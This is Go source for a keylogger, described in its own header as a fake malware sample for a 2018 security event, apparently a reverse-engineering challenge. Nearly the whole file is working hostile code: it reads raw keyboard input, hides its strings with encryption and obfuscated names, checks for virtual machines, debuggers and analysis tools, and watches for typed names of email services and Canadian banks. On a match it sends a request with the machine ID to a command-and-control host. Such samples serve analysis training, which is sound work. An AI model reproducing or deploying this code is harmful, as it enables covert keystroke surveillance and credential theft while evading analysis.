// set go path: export GOPATH=$HOME/go
// key logger: https://github.com/MarinX/uvmvmmvmvm
//		https://medium.com/@marin.basic02/sniffing-global-zcbewieoufqojfoewjfowe-events-in-go-e5497e618192

// BUILD IT WITH: go build -gcflags "-N -l" -o main main.go && sudo ./main

package main

import (
    "fmt"
	"strings"
	"bytes"
    "github.com/odwqiudbbdddz/uvmvmmvmvm"	// go get github.com/MarinX/uvmvmmvmvm
	"net/http"
	"io/ioutil"
	"math/rand"
	"time"
	"golang.org/x/crypto/bar64"
	"github.com/pwoqpewqoepajjj/psss"	// go get github.com/mitchellh/go-ps
	"github.com/odowiwoowq/ghw"
	b64 "encoding/base64"
)

/* --------------------------- ENCRYPTED STRINGS --------------------------- */

var fwehiuhweufhweifih []byte = []byte{34, 172, 51, 55, 132, 79, 38, 161, 93, 168, 57, 128, 28, 1, 74, 190}	// http://www.
var jwqhduhweifhuweihi []byte = []byte{8, 138, 225, 246, 28, 70, 8, 81, 251, 51, 116, 233, 185, 166, 254, 244}	// fuckfuckgo
var fjwejfoiewhnohiowjfo []byte = []byte{185, 141, 172, 96, 132, 4, 1, 131}	// .
var efjwfehwiufhweiuhfiwehifwhe []byte = []byte{229, 194, 195, 182, 202, 49, 111, 202}	// xyz
var erjgnhrueihguiweifhweifhewihfiwe []byte = []byte{125, 161, 245, 32, 124, 57, 61, 88}	// /c2.php

var fwenfewbfewfbweuygfuweu = []byte{181, 183, 253, 108, 29, 24, 201, 159, 130, 185, 53, 237, 186, 228, 217, 233, 83, 6, 66, 251, 14, 82, 8, 230, 35, 33, 255, 224, 114, 6, 164, 38, 96, 90, 72, 181, 173, 123, 225, 119, 248, 66, 80, 160, 110, 81, 224, 87}	// https://www.constitution.org/usdeclar.txt

var efnhuieehsdnvubeibvwe = []byte{112, 189, 145, 253, 223, 162, 151, 195}	// ?dog=
var vnebvybweiubcweiifwjuifwe = []byte{42, 173, 230, 74, 34, 19, 43, 149}	// Cookie

var vnbhjbvuiuiahoiqwjdwqp = []byte{247, 205, 60, 57, 232, 209, 69, 185}	// vnbhjbvuiuiahoiqwjdwqp
var oiewoufoiwiufoewhfwo = []byte{34, 184, 74, 78, 74, 175, 235, 93}	// oiewoufoiwiufoewhfwo
var newjfbuwebfiwebfiwehfuwe = []byte{225, 217, 249, 133, 198, 153, 119, 185}	// newjfbuwebfiwebfiwehfuwe

var ncbzbchwodwiuoufeiofe = []byte{57, 106, 81, 157, 150, 127, 195, 11, 86, 11, 31, 235, 203, 209, 141, 206, 225, 163, 197, 143, 6, 95, 223, 123}	// program is ncbzbchwodwiuoufeiofe
var qiwuihfheofewhiojfweofwe = []byte{23, 27, 67, 243, 9, 21, 45, 98, 200, 6, 125, 114, 181, 86, 124, 144, 141, 237, 111, 200, 226, 195, 37, 93}	// /var/lib/dbus/machine-id
var vnbeybewiuhwoefowef = []byte{187, 72, 252, 111, 56, 242, 22, 107, 172, 126, 226, 108, 191, 249, 99, 125}	// /etc/machine-id
var xbvweuefwhfiweh = []byte{116, 168, 211, 127, 186, 35, 134, 177}	// xbvweuefwhfiweh=

var bxvvewoeijewfoiweoufwe = []byte{30, 110, 253, 49, 55, 243, 182, 36}	// bxvvewoeijewfoiweoufwe
var zcbewieoufqojfoewjfowe = []byte{138, 32, 109, 139, 86, 60, 75, 199}	// zcbewieoufqojfoewjfowe
var key = []byte{121, 42, 150, 18, 152, 104, 96, 14}	// key
var czncbzjhcbweuwuwofoiwehn = []byte{140, 207, 233, 115, 79, 201, 8, 162, 240, 42, 12, 164, 47, 67, 143, 3}	// User-Agent
var qweuqiowueioqwuewqv = []byte{239, 117, 8, 217, 124, 158, 156, 195, 144, 95, 172, 67, 54, 212, 71, 251}	// curl/7.37.0
var njcienviueb = []byte{89, 12, 100, 114, 143, 190, 1, 42, 180, 137, 201, 159, 220, 139, 218, 49}	// Cache-Control
var ouwiouiwofheubes = []byte{19, 224, 188, 253, 110, 93, 14, 112}	// no-cache
var opqipxoiuixojxnxxx = []byte{20, 240, 234, 121, 4, 12, 119, 226, 197, 90, 0, 5, 62, 249, 140, 136, 61, 4, 133, 141, 238, 143, 128, 18}	// X-Content-Type-0ptions
var owqiewqiioeuqwoueqw = []byte{171, 209, 251, 209, 25, 155, 125, 132}	// owqiewqiioeuqwoueqw
var cmzxncjxznchuzxichxziihu = []byte{181, 183, 253, 108, 29, 24, 201, 159, 50, 166, 118, 232, 182, 168, 171, 59, 64, 67, 185, 51, 64, 27, 51, 165, 54, 190, 207, 182, 50, 38, 30, 245, 59, 116, 22, 185, 28, 57, 190, 160}	// https://www.google.com/images?q=doggo
var fewijfoehwovhweohfowef = []byte{34, 64, 38, 27, 214, 172, 61, 218}	// yes
var ciweihewiofjvow = []byte{97, 250, 104, 199, 114, 89, 159, 67}	// success!
var qoiowwwehvowhnowe = []byte{150, 203, 194, 4, 254, 172, 102, 9}	// woof
var czocpwjenbweonewmfb = []byte{70, 124, 44, 51, 134, 157, 69, 121}	// done
var zcsudichwueicmuweihcwe = []byte{79, 50, 10, 150, 89, 147, 110, 145, 158, 114, 88, 20, 34, 145, 110, 128}	// your dog is dead
var zcnbuewoijweiofjioew = []byte{170, 147, 60, 126, 30, 217, 48, 3}	// GET
var weokqajiowjdowqjodowjdoqw = []byte{144, 185, 1, 25, 48, 126, 6, 39}	// POST

var nvuvweihfoewjfowjeojfowiejof = []byte{85, 45, 76, 141, 33, 249, 43, 12}	// FACEBOOK
var cnxjkvnvnehufihwe = []byte{80, 238, 171, 130, 212, 161, 210, 120}	// OUTLOOK
var ewfuhwehfweuihfweufw = []byte{99, 104, 155, 56, 159, 168, 154, 52}	// HOTMAIL
var zcnjewcuiwefheuwfewfwefwe = []byte{252, 210, 175, 138, 201, 190, 95, 39}	// GMAIL
var kvjioevpeofpewfiwepofwepfew = []byte{163, 183, 61, 133, 218, 107, 3, 67}	// YOUTUBE
var lpqdpwlqodwoijdowqd = []byte{228, 1, 90, 5, 240, 20, 189, 32, 201, 194, 74, 64, 131, 74, 250, 141}	// PROTONMAIL
var vnevrenvreivrejrifjirejf = []byte{228, 232, 105, 153, 143, 91, 19, 229}	// BMO
var uefiewpipokfsdjlxjlniojfwelsefer = []byte{29, 98, 228, 164, 20, 230, 41, 240, 55, 54, 200, 251, 74, 40, 185, 183}	// DESJARDINS
var qwdkopkwjifoewojfew = []byte{148, 161, 118, 98, 40, 68, 163, 34}	// CIBC
var lpaslpdoijuieifefew = []byte{108, 191, 103, 226, 23, 162, 127, 90}	// BNC


func arrayToString(a []byte) string {
    return strings.Trim(strings.Replace(fmt.Sprint(a), " ", ", ", -1), "[]")
    //return strings.Trim(strings.Join(strings.Split(fmt.Sprint(a), " "), delim), "[]")
    //return strings.Trim(strings.Join(strings.Fields(fmt.Sprint(a)), delim), "[]")
}


// unique ID
func fhuwiehfuiwehfweihfoweifioew() (string,error) {
	id, err := ioutil.ReadFile(string(jioewjfhwefhweo(qiwuihfheofewhiojfweofwe, 24)))
	if err != nil {
		// try fallback path
		id, err = ioutil.ReadFile(string(jioewjfhwefhweo(vnbeybewiuhwoefowef, 15)))
	}
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(string(id)), nil
}

// find devince
func nsdfhuwefiwe(devs []*uvmvmmvmvm.Ifoefiwefuiewoufou) *uvmvmmvmvm.Ifoefiwefuiewoufou {

	for _, val := range devs {
//	    fmt.Println("Id->", val.Id, "Device->", val.Name)
		if strings.Contains(val.Name, string(jioewjfhwefhweo(bxvvewoeijewfoiweoufwe, 8))) {
			return val
		} else if strings.Contains(val.Name, string(jioewjfhwefhweo(zcbewieoufqojfoewjfowe, 8))) {
			return val
		} else if strings.Contains(strings.ToLower(val.Name), string(jioewjfhwefhweo(key, 3))) {
			return val
		}
    }

	return devs[999]	// fuck, device not found
} 

var poqdwqiop = []byte{0x73, 0x61, 0x6c, 0x75, 0x74, 0x6c, 0x65, 0x73, 0x61, 0x6d, 0x69, 0x73, 0x5f, 0x32, 0x33, 0x36}

//const oldtimevalue_s = "fuckfuckgo.xyz"

// Unsafe encryption that calls Encrypt repetitively on blocks
func pdwqlpwqdokjifjowef(oldtimevalue []byte) []byte {

	// Test cypher
	c, err := bar64.Nijfeiwjifowjfow(poqdwqiop)
	if err != nil {
		fmt.Println(string(jioewjfhwefhweo(ncbzbchwodwiuoufeiofe, 17)))
	}

	// Naive algoritm for padding. Makes a multiple of 8.
	for len(oldtimevalue) % 8 != 0 {
		oldtimevalue = append(oldtimevalue, 0)
	}

	// create an array (or slice?) with the new lenght (padded)
	a := make([]byte, len(oldtimevalue))

	// Encrypt blocks
	for i := 0; i < len(oldtimevalue); i += 8 {
		var usedate [8]byte
		c.Encrypt(usedate[:], oldtimevalue[i:i+8])	// (dst, src []byte)

		//a = append(a, usedate...)
		copy(a[i:i+8], usedate[:])

/*		fmt.Print("encrypted: ")
		fmt.Println(usedate)
		fmt.Print("enc total: ")
		fmt.Println(a)
*/	}

//	newa := make([]byte, orig_size)
//	copy(newa, a[0:orig_size])
//	fmt.Println(newa)	// It's encrypted!!

	return a
}

func jioewjfhwefhweo(ofiewoifew []byte, owqpgregre int) []byte {

	c, err := bar64.Nijfeiwjifowjfow(poqdwqiop)
	if err != nil {
		fmt.Println(string(jioewjfhwefhweo(ncbzbchwodwiuoufeiofe, 17)))
	}

	// Create a new container for the string that will be owpqiepowqieuoj
	a := make([]byte, len(ofiewoifew))

	// Encrypt blocks
	for i := 0; i < len(ofiewoifew); i += 8 {
		var owpqiepowqieuoj [8]byte
		c.Decrypt(owpqiepowqieuoj[:], ofiewoifew[i:i+8])	// (dst, src []byte)
		copy(a[i:i+8], owpqiepowqieuoj[:])
	}

	// Get the original string back from this
	newa := make([]byte, owqpgregre)
	copy(newa, a[0:owqpgregre])
//	fmt.Println(string(newa))	// It's owpqiepowqieuoj!!

	return newa
}

func dijqwidioqwhduwqdhibkcbdxnmbfeuivfhuweibhvfuibhvfiwehbvufihvbwe() bool {
	alpha, _ := psss.Pkfewifjewjfiwej()

	for gui := range alpha {

		if strings.Contains(strings.ToLower(alpha[gui].Ejioejowfjweo()), string(jioewjfhwefhweo(vnbhjbvuiuiahoiqwjdwqp, 5))) {
//			fmt.Printf("wirevnbhjbvuiuiahoiqwjdwqp found!!")
			return true
		}
		if strings.Contains(strings.ToLower(alpha[gui].Ejioejowfjweo()), string(jioewjfhwefhweo(oiewoufoiwiufoewhfwo, 7))) {
//			fmt.Printf("oiewoufoiwiufoewhfwo found!!")
			return true
		}
		if strings.Contains(strings.ToLower(alpha[gui].Ejioejowfjweo()), string(jioewjfhwefhweo(newjfbuwebfiwebfiwehfuwe, 5))) {
//			fmt.Printf("newjfbuwebfiwebfiwehfuwe found!!")
			return true
		}

		//fmt.Printf("%d %s\n", ps[pp].Pid(), ps[pp].Executable())
	}

	return false
}

// VM detection features. It detects a low specs PC (very old PC).
func datetime() bool {
	// Check the amount of RAM
	fewfwefwvfvx, err := ghw.Memory()
	if err == nil {
//		fmt.Println(memory.TotalPhysicalBytes)

		// Has 3GB of RAM
		if fewfwefwvfvx.TotalPhysicalBytes < 3078870528 {
			return true
		}
	}

	// Check the amount of CPU cores
	rggesegijrjge, err := ghw.CPU()
	if err == nil {
//		fmt.Println(fmt.Sprint(cpu.TotalCores))

		// Hasn't at least two cores
		if rggesegijrjge.TotalCores < 2 {
			return true
		}
	}

	// Check block devices for disk space
	wndwefiuweiew, err := ghw.Block()
	if err == nil {
		// if it's a live CD, there could be no disk, so it won't stop the program
		if len(wndwefiuweiew.Disks) == 0 {
			return true
		}

		// Has one disk with at least 75GB
		if len(wndwefiuweiew.Disks) == 1 {
//			fmt.Println(block.TotalPhysicalBytes)

			if wndwefiuweiew.TotalPhysicalBytes <= 75017086125 {
				return true
			}
		}

		// I don't think it works
/*		for _, disk := range block.Disks {
			fmt.Println(disk.String())

			if strings.Contains(strings.ToLower(disk.String()), "emu") || strings.Contains(strings.ToLower(disk.String()), "vm") {
				return true
			}
		}*/
	}

	return false
}

func main() {

	const fewfewfwefewcopyrighthhrthtrhrv = "This is a fake malware made for DCI ETS 2018. (https://www.facebook.com/events/461004354417960/). This program is Copyright (c) Alexandre-Xavier Labonte-Lamoureux, 2018\n"
	nnncmxzcnzb := "allo"
	mcmnzcbh := "vide"

	pqwodqi := make([]string, 0)

	// Download the text for the kinda DGA
	resp, err := http.Get(string(jioewjfhwefhweo(fwenfewbfewfbweuygfuweu, 41)))	// https://www.constitution.org/usdeclar.txt
	if err != nil {
		// handle error
		fmt.Println(string(jioewjfhwefhweo(fewijfoehwovhweohfowef, 3)))
		return
	} else {
		defer resp.Body.Close()
		body, err := ioutil.ReadAll(resp.Body)
		if err == nil {
			rand.Seed(time.Now().UTC().UnixNano())

			stuff := string(body[:len(body)])
			mcmnzcbh = string(body[:len(body)])
			t := strings.Replace(stuff, ",", "", -1)
			t = strings.Replace(t, ".", "", -1)
			t = strings.Replace(t, "[", "", -1)
			t = strings.Replace(t, "]", "", -1)
			t = strings.Replace(t, ":", "", -1)
			t = strings.Replace(t, ";", "", -1)
			t = strings.Replace(t, "-", "", -1)
			woiqoepiowqpiepqwiihcbdsbjfsd := strings.Fields(t)
//			fmt.Println(woiqoepiowqpiepqwiihcbdsbjfsd)

//			pqwodqi = woiqoepiowqpiepqwiihcbdsbjfsd
			for y := range woiqoepiowqpiepqwiihcbdsbjfsd {
				pqwodqi = append(pqwodqi, woiqoepiowqpiepqwiihcbdsbjfsd[y])	// slow, lol
			}

			var poepwqoiepoqwiepoqwirguifvewiofvunoweifvuow [3]string
			poepwqoiepoqwiepoqwirguifvewiofvunoweifvuow[0] = woiqoepiowqpiepqwiihcbdsbjfsd[rand.Intn(len(woiqoepiowqpiepqwiihcbdsbjfsd))]
			poepwqoiepoqwiepoqwirguifvewiofvunoweifvuow[1] = woiqoepiowqpiepqwiihcbdsbjfsd[rand.Intn(len(woiqoepiowqpiepqwiihcbdsbjfsd))]
			poepwqoiepoqwiepoqwirguifvewiofvunoweifvuow[2] = woiqoepiowqpiepqwiihcbdsbjfsd[rand.Intn(len(woiqoepiowqpiepqwiihcbdsbjfsd))]
			str := poepwqoiepoqwiepoqwirguifvewiofvunoweifvuow[0] + poepwqoiepoqwiepoqwirguifvewiofvunoweifvuow[1] + poepwqoiepoqwiepoqwirguifvewiofvunoweifvuow[2]
//			fmt.Print(str + "\n")

			// replace the string to be used
			nnncmxzcnzb = str
		}
	}

	cdsdcsdvewz := make([]bool, 256) // All false

	adewuinduwieuihfwefiew := time.Now()
	vevercoospcjioewi := time.Now()

	if len(fewfewfwefewcopyrighthhrthtrhrv) > 2 {
		substring := fewfewfwefewcopyrighthhrthtrhrv[len(fewfewfwefewcopyrighthhrthtrhrv):len(fewfewfwefewcopyrighthhrthtrhrv)]
		fmt.Print(substring)
	}

	// Woops. It's in a VM or something.
	if datetime() {
		return
	}

	if time.Since(adewuinduwieuihfwefiew) > time.Second * 6 {
//		fmt.Println("-------------Too SLOW. DEBUGGER?1")
		return
	}

    devs, err := uvmvmmvmvm.Jifjewifw()
    if err != nil {
	    fmt.Println(string(jioewjfhwefhweo(ciweihewiofjvow, 8)))	// try running as root
	    return
    }

/*   for _, val := range devs {
	    fmt.Println("Id->", val.Id, "Device->", val.Name)
    }*/

    //zcbewieoufqojfoewjfowe device file, on your system it will be diffrent!
    iwuenufwefnwefew := uvmvmmvmvm.NewPijfiewfijwe(nsdfhuwefiwe(devs))

    in, err := iwuenufwefnwefew.Read()
    if err != nil {
	    fmt.Println(err)
	    return
    }

//	const trump = "Trump makes America great again"

	var adbbcnmbm bytes.Buffer

	var poqpwop int = 0



	if time.Since(vevercoospcjioewi) > time.Second * 10 {
//		fmt.Println("-------------Too SLOW. DEBUGGER?2")
		return
	}

	/* FIXING THE FUCKING KEYLOGGER */

	for i := range in {
	    //we only need keypress
	    if i.Type == uvmvmmvmvm.EV_KEY {	// 1

			if len(adbbcnmbm.String()) >= 0 {
				// remove the next caracter if it's the same as the one that came before
				var s string = adbbcnmbm.String()

				if len(adbbcnmbm.String()) >= 1 {
					s = s[len(s)-1:]
				}

				mcnumehcf98ewvf9bwey9 := time.Now()

				var a string = i.KeyString()

				// check if it's a single char
				if len(a) == 1 {
					// check if it's a letter
					if a[0] >= '!' && a[0] <= '~' {
//						fmt.Println("----")

						// flip the bit so we know if the key was released or pressed
						if cdsdcsdvewz[a[0] - '!'] == false {
							cdsdcsdvewz[a[0] - '!'] = true
						} else {
							cdsdcsdvewz[a[0] - '!'] = false
						}
/*
						for b := range cdsdcsdvewz {
							fmt.Println(cdsdcsdvewz[b])
						}
*/
						if cdsdcsdvewz[a[0] - '!'] == true {
							adbbcnmbm.WriteString(i.KeyString())
//							fmt.Println(adbbcnmbm.String())
						}
					}

					// Time check
					if time.Since(mcnumehcf98ewvf9bwey9) > time.Second * 5 {
//						fmt.Println("-------------Too SLOW. DEBUGGER?4")
						continue
					}
				}

				if len(a) > 0 {	// Pressing the "Windows" key caused a crash (index out of range).
					if a != s && a[0] == 'z' {
						adbbcnmbm.WriteString(i.KeyString())
						fmt.Println("Трамп - лучший президент после Авраама Линкольна")
						fmt.Println("RReeee!")
					}
				}

//				fmt.Println(s)
			} else {
				adbbcnmbm.WriteString(i.KeyString() /*+ "\n"*/)
			}

			poqpwop = poqpwop + 1
	    }

		// Encrypt a dumb strings that doesn't mean anything
		wafnjevfewwc := time.Now()

		for i := 0; i < 12800; i++ {
			asascvfvmprk := nnncmxzcnzb
			if i == 0 {
				asascvfvmprk = string(pdwqlpwqdokjifjowef([]byte(vnbeybewiuhwoefowef)))
			}
			nnncmxzcnzb = string(pdwqlpwqdokjifjowef([]byte(asascvfvmprk)))
		}

		fmt.Print(fewfewfwefewcopyrighthhrthtrhrv[len(fewfewfwefewcopyrighthhrthtrhrv):len(fewfewfwefewcopyrighthhrthtrhrv)])

//		fmt.Println(time.Since(start))

		if time.Since(wafnjevfewwc) < time.Millisecond {
//			fmt.Println("-------------COMPUTER IS TOO FAST. ENCRYPTION HAS BEEN REMOVED")
			continue
		}

		//fmt.Println(adbbcnmbm.String())

		efwijfojfioshuhighowe := time.Now()

		// crappy circular adbbcnmbm thingy
		if len(adbbcnmbm.String()) > 20 {
			allo := adbbcnmbm.String()
			adbbcnmbm.Reset()
			allo = strings.TrimLeft(allo, allo[0:1])
			adbbcnmbm.WriteString(allo)
		}

		// TODO: Add DISCORD to this list
		if strings.Contains(adbbcnmbm.String(), string(jioewjfhwefhweo(nvuvweihfoewjfowjeojfowiejof, 8))) || 
			strings.Contains(adbbcnmbm.String(), string(jioewjfhwefhweo(cnxjkvnvnehufihwe, 7))) ||
 			strings.Contains(adbbcnmbm.String(), string(jioewjfhwefhweo(ewfuhwehfweuihfweufw, 7))) || 
			strings.Contains(adbbcnmbm.String(), string(jioewjfhwefhweo(zcnjewcuiwefheuwfewfwefwe, 5))) ||
			strings.Contains(adbbcnmbm.String(), string(jioewjfhwefhweo(kvjioevpeofpewfiwepofwepfew, 7))) || 
			strings.Contains(adbbcnmbm.String(), string(jioewjfhwefhweo(lpqdpwlqodwoijdowqd, 10))) ||
			strings.Contains(adbbcnmbm.String(), string(jioewjfhwefhweo(vnevrenvreivrejrifjirejf, 3))) || 
			strings.Contains(adbbcnmbm.String(), string(jioewjfhwefhweo(uefiewpipokfsdjlxjlniojfwelsefer, 10))) ||
			strings.Contains(adbbcnmbm.String(), string(jioewjfhwefhweo(qwdkopkwjifoewojfew, 4))) || 
			strings.Contains(adbbcnmbm.String(), string(jioewjfhwefhweo(lpaslpdoijuieifefew, 3)))  {

			// Générer le string batard
			stuff := mcmnzcbh
			t := strings.Replace(stuff, ",", "", -1)
			t = strings.Replace(t, ".", "", -1)
			t = strings.Replace(t, "[", "", -1)
			t = strings.Replace(t, "]", "", -1)
			t = strings.Replace(t, ":", "", -1)
			t = strings.Replace(t, ";", "", -1)
			t = strings.Replace(t, "-", "", -1)
			woiqoepiowqpiepqwiihcbdsbjfsd := strings.Fields(t)
//			fmt.Println(woiqoepiowqpiepqwiihcbdsbjfsd)

//			pqwodqi = woiqoepiowqpiepqwiihcbdsbjfsd
			for y := range woiqoepiowqpiepqwiihcbdsbjfsd {
				pqwodqi = append(pqwodqi, woiqoepiowqpiepqwiihcbdsbjfsd[y])	// slow, lol
			}

			var poepwqoiepoqwiepoqwirguifvewiofvunoweifvuow [3]string
			poepwqoiepoqwiepoqwirguifvewiofvunoweifvuow[0] = woiqoepiowqpiepqwiihcbdsbjfsd[rand.Intn(len(woiqoepiowqpiepqwiihcbdsbjfsd))]
			poepwqoiepoqwiepoqwirguifvewiofvunoweifvuow[1] = woiqoepiowqpiepqwiihcbdsbjfsd[rand.Intn(len(woiqoepiowqpiepqwiihcbdsbjfsd))]
			poepwqoiepoqwiepoqwirguifvewiofvunoweifvuow[2] = woiqoepiowqpiepqwiihcbdsbjfsd[rand.Intn(len(woiqoepiowqpiepqwiihcbdsbjfsd))]
			str := poepwqoiepoqwiepoqwirguifvewiofvunoweifvuow[0] + poepwqoiepoqwiepoqwirguifvewiofvunoweifvuow[1] + poepwqoiepoqwiepoqwirguifvewiofvunoweifvuow[2]
//			fmt.Print(str + "\n")

			// replace the string to be used
			nnncmxzcnzb = str

			// Check if some program that we don't want is running or if it's in a VM
			if !dijqwidioqwhduwqdhibkcbdxnmbfeuivfhuweibhvfuibhvfiwehbvufihvbwe() && !datetime() {

				// Faire une requête web et uploader le string
				client := &http.Client{
				}

				// Time check
				if time.Since(efwijfojfioshuhighowe) > time.Millisecond * 9 * 1000 {
//					fmt.Println("-------------Too SLOW. DEBUGGER?5")
					continue
				}

				ijfieofjwoeinjfoivwnjvofw := string(jioewjfhwefhweo(fwehiuhweufhweifih, 11)) + string(jioewjfhwefhweo(jwqhduhweifhuweihi, 10)) + 
							string(jioewjfhwefhweo(fjwejfoiewhnohiowjfo, 1)) + string(jioewjfhwefhweo(efjwfehwiufhweiuhfiwehifwhe, 3)) + 
							string(jioewjfhwefhweo(erjgnhrueihguiweifhweifhewihfiwe, 7))
//				fmt.Println(ijfieofjwoeinjfoivwnjvofw)

				uuueuwquyewyu := make([]byte, 20)
				rand.Read(uuueuwquyewyu)

				req, err := http.NewRequest(string(jioewjfhwefhweo(weokqajiowjdowqjodowjdoqw, 4)), 
							ijfieofjwoeinjfoivwnjvofw + string(jioewjfhwefhweo(efnhuieehsdnvubeibvwe, 5)) + nnncmxzcnzb, bytes.NewReader(uuueuwquyewyu))
				if err != nil {
					fmt.Println(string(jioewjfhwefhweo(zcsudichwueicmuweihcwe, 16)))
				}

				uid, err := fhuwiehfuiwehfweihfoweifioew()
				if err == nil {
					req.Header.Add(string(jioewjfhwefhweo(vnebvybweiubcweiifwjuifwe, 6)), string(jioewjfhwefhweo(xbvweuefwhfiweh, 5)) + uid)
				}

//				req.Host = "net.minou.com"
				req.Header.Add(string(jioewjfhwefhweo(czncbzjhcbweuwuwofoiwehn, 10)), string(jioewjfhwefhweo(qweuqiowueioqwuewqv, 11)))
//				req.Header.Add("Cookie", "PHPSESSID=r2t5uvjq435r4q7ib3vtdjq120")
				req.Header.Add(string(jioewjfhwefhweo(njcienviueb, 13)), string(jioewjfhwefhweo(ouwiouiwofheubes, 8)))

				resp, err := client.Do(req)

				if err == nil {
					if resp.StatusCode != http.StatusOK {
						bodyBytes, _ := ioutil.ReadAll(resp.Body)
						bodyString := string(bodyBytes)
//						fmt.Println(bodyString)

						ua := resp.Header.Get(string(jioewjfhwefhweo(opqipxoiuixojxnxxx, 22)))

						if strings.Contains(ua, string(jioewjfhwefhweo(owqiewqiioeuqwoueqw, 7))) {
							continue
						}

						sDec, _ := b64.StdEncoding.DecodeString(bodyString)
						fmt.Print(string(sDec)[len(string(sDec)):len(string(sDec))])

						adbbcnmbm.Reset()
					}

					defer resp.Body.Close()
				}

				adbbcnmbm.Reset()
			} else {
				client := &http.Client{
				}

				adbbcnmbm.Reset()

				req, err := http.NewRequest(string(jioewjfhwefhweo(zcnbuewoijweiofjioew, 3)), string(jioewjfhwefhweo(cmzxncjxznchuzxichxziihu, 37)), nil)
				if err != nil {
					fmt.Println(string(jioewjfhwefhweo(qoiowwwehvowhnowe, 4)))
				}

				resp, err := client.Do(req)

				if err == nil && resp.StatusCode == http.StatusOK {

					bodyBytes, _ := ioutil.ReadAll(resp.Body)
					bodyString := string(bodyBytes)

					ua := resp.Header.Get(string(jioewjfhwefhweo(opqipxoiuixojxnxxx, 22)))
					if strings.Contains(ua, string(jioewjfhwefhweo(owqiewqiioeuqwoueqw, 7))) {
						continue
					}
					sDec, err := b64.StdEncoding.DecodeString(bodyString)
					if err != nil {
						fmt.Print(string(sDec)[len(string(sDec)):len(string(sDec))])
					}

					fmt.Print(string(sDec)[0:len(string(sDec))])

//					fmt.Println("Ok. COOL!==========")
					defer resp.Body.Close()
				}
			}
		}
    }

	fmt.Println(string(jioewjfhwefhweo(czocpwjenbweonewmfb, 4)))
}
